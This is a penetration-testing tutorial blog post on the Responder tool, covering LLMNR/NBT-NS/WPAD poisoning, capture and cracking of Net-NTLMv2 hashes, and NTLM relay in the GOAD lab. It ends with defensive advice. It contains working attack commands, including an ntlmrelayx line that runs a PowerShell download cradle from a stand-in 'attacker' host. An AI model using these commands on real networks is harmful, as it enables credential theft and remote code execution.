---
layout: post
title: "10 Days of AD Security: Day 8 - Responder"
date: 2026-03-30
category: Active Directory Security
author: James Wells
---

## History and Overview

Responder is an LLMNR, NBT-NS, and mDNS poisoning attack tool created by Laurent Gaffié (@lgandx) and released in 2013. The tool exploits a fundamental weakness in Windows name resolution: when a system can't resolve a hostname via DNS, it falls back to broadcast protocols LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service). Responder listens for these broadcast queries and responds poisonous answers, claiming to be the requested resource. When victims attempt to authenticate to Responder, it captures their Net-NTLMv1/v2 hashes, which can then be cracked offline or relayed to other systems for authentication. What makes Responder particularly effective is its passive nature—it simply waits for mistyped share paths, failed DNS lookups, or automatic authentication attempts that occur naturally in Windows environments. The tool also includes rogue authentication servers (HTTP, SMB, SQL, FTP, LDAP, etc.) to capture credentials when victims connect. With 6.4k GitHub stars and continuous updates through January 2025, Responder remains one of the most reliable initial access and credential capture tools in AD penetration testing. Its effectiveness hasn't diminished despite being over a decade old, because the underlying protocols it exploits are still widely enabled in enterprise networks for compatibility.

## Download and Installation

**Official Source:** [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

**Installation:**

```bash
# On Kali Linux (pre-installed)
sudo apt update
sudo apt install responder

# Or install from source
git clone https://github.com/lgandx/Responder.git
cd Responder

# Check network interface
ip addr
```

**Pre-Use Configuration:**

Edit `Responder.conf` to customize:
- Which services to enable (HTTP, SMB, SQL, etc.)
- Challenge type (Random is default, avoid custom)
- WPAD proxy settings
- Database file location

## When to Use Responder

Use Responder when you need to:
- **Capture credentials passively**: Wait for network authentication attempts
- **Initial access from network foothold**: Convert network access to credentials
- **Audit LLMNR/NBT-NS exposure**: Demonstrate risk of broadcast protocols
- **Complement other attacks**: Run during password spraying or exploitation
- **Capture hashes for cracking**: Obtain Net-NTLMv2 hashes for offline attacks
- **Prepare for NTLM relay**: Identify systems attempting authentication
- **Exploit WPAD misconfigurations**: Poison Web Proxy Auto-Discovery
- **Capture SQL/LDAP credentials**: Target specific service authentication

Responder is typically used early in an engagement when you have network access but few or no credentials. It's often left running in the background throughout an assessment to opportunistically capture credentials.

## Walkthrough

**Basic Credential Capture:**

```bash
# Run Responder on default interface
sudo responder -I eth0

# Analyze mode (don't respond, just observe)
sudo responder -I eth0 -A

# Verbose output
sudo responder -I eth0 -v
```

**Targeted Poisoning:**

```bash
# Enable WPAD rogue proxy
sudo responder -I eth0 -wF

# Force NTLM downgrade (v1 for easier cracking)
sudo responder -I eth0 -F

# Disable SMB and HTTP servers (relay prep)
sudo responder -I eth0 -d -w

# Custom options
sudo responder -I eth0 --lm --disable-ess
```

**Captured Hash Location:**

```bash
# Hashes saved to logs directory
ls Responder/logs/

# Example files:
# HTTP-NTLMv2-192.168.1.50.txt
# SMB-NTLMv2-Client-192.168.1.45.txt

# View captured hashes
cat Responder/logs/HTTP-NTLMv2-*.txt
```

**Cracking Captured Hashes:**

```bash
# Extract hashes for hashcat
cat Responder/logs/*NTLMv2*.txt > captured-hashes.txt

# Crack with hashcat (mode 5600 for NTLMv2)
hashcat -m 5600 captured-hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john --format=netntlmv2 captured-hashes.txt --wordlist=rockyou.txt
```

**WPAD Attack:**

```bash
# Enable WPAD poisoning
sudo responder -I eth0 -wF

# When clients query for WPAD, Responder provides malicious PAC file
# All HTTP/HTTPS traffic proxies through Responder
# Captures credentials for web authentication
```

**Integration with NTLM Relay:**

```bash
# Disable SMB and HTTP in Responder (prepare for relay)
sudo nano Responder/Responder.conf
# Set SMB = Off, HTTP = Off

# Run Responder to poison only
sudo responder -I eth0

# In another terminal, run ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Responder poisons, ntlmrelayx relays to targets
```

## Game of Active Directory Lab Example

In the GOAD environment, Responder captures credentials from network interactions:

**Scenario: From Network Access to Domain Credentials**

1. **Initial Setup**:
   ```bash
   # From Kali Linux on GOAD network
   # Check interface (usually eth0 or eth1)
   ip addr

   # Start Responder
   sudo responder -I eth1 -wFv
   ```

2. **Passive Capture**:
   ```
   # Responder waits for events like:
   # - User mistyping \\sharee instead of \\share
   # - Application trying to resolve non-existent server
   # - WPAD queries from browsers
   # - SQL Server connection attempts
   ```

3. **Simulating Capture in GOAD**:
   ```powershell
   # From GOAD Windows workstation
   # Mistype a share path (intentional for demo)
   net use \\nonexistentserver\share

   # Responder captures Net-NTLMv2 hash
   ```

4. **Hash Analysis**:
   ```bash
   # View captured hash
   cat Responder/logs/SMB-NTLMv2-192.168.56.22.txt

   # Example output:
   # samwell.tarly::NORTH:1122334455667788:response:challenge
   ```

5. **Offline Cracking**:
   ```bash
   # Crack the hash
   hashcat -m 5600 Responder/logs/SMB-NTLMv2-192.168.56.22.txt /usr/share/wordlists/rockyou.txt --force

   # Successfully cracked: Heartsbane
   ```

6. **Using Captured Credentials**:
   ```bash
   # Validate against GOAD systems
   nxc smb 192.168.56.0/24 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local

   # Begin enumeration with valid credentials
   ```

7. **NTLM Relay Attack in GOAD**:
   ```bash
   # Disable Responder SMB/HTTP
   sudo nano /usr/share/responder/Responder.conf
   # SMB = Off, HTTP = Off

   # Terminal 1: Responder poisoning
   sudo responder -I eth1 -v

   # Terminal 2: Relay to GOAD targets
   impacket-ntlmrelayx -tf goad-targets.txt -smb2support -c "powershell.exe IEX(New-Object Net.WebClient).downloadString('http://attacker/payload')"
   ```

**GOAD-Specific Responder Scenarios:**
- Capture authentication from GOAD workstations accessing file shares
- Target GOAD SQL Server connections from applications
- Demonstrate WPAD attacks on GOAD client systems
- Relay captured authentications to GOAD servers without SMB signing
- Show how one captured hash leads to domain enumeration

## Conclusion

Responder remains one of the most effective tools for passive credential capture in Active Directory environments. Its longevity—over 13 years since release—demonstrates both the reliability of the tool and the persistent vulnerability of the protocols it exploits. Despite Microsoft's efforts to phase out LLMNR and NBT-NS, these protocols remain enabled in most enterprise networks for backwards compatibility.

In the GOAD lab, Responder demonstrates how network position translates to credential access. The tool's passive nature makes it ideal for long-running engagements where patience yields results. Combined with NTLM relay attacks, Responder enables privilege escalation without cracking a single password.

For defenders, Responder serves as a powerful argument for disabling LLMNR and NBT-NS via Group Policy, implementing SMB signing, and monitoring for abnormal authentication patterns. Regular penetration tests should include Responder to identify and remediate these risks before attackers exploit them.

**Next in this series:** Day 9 will cover Evil-WinRM, the ruby-based WinRM shell that enables powerful post-exploitation through Windows Remote Management.
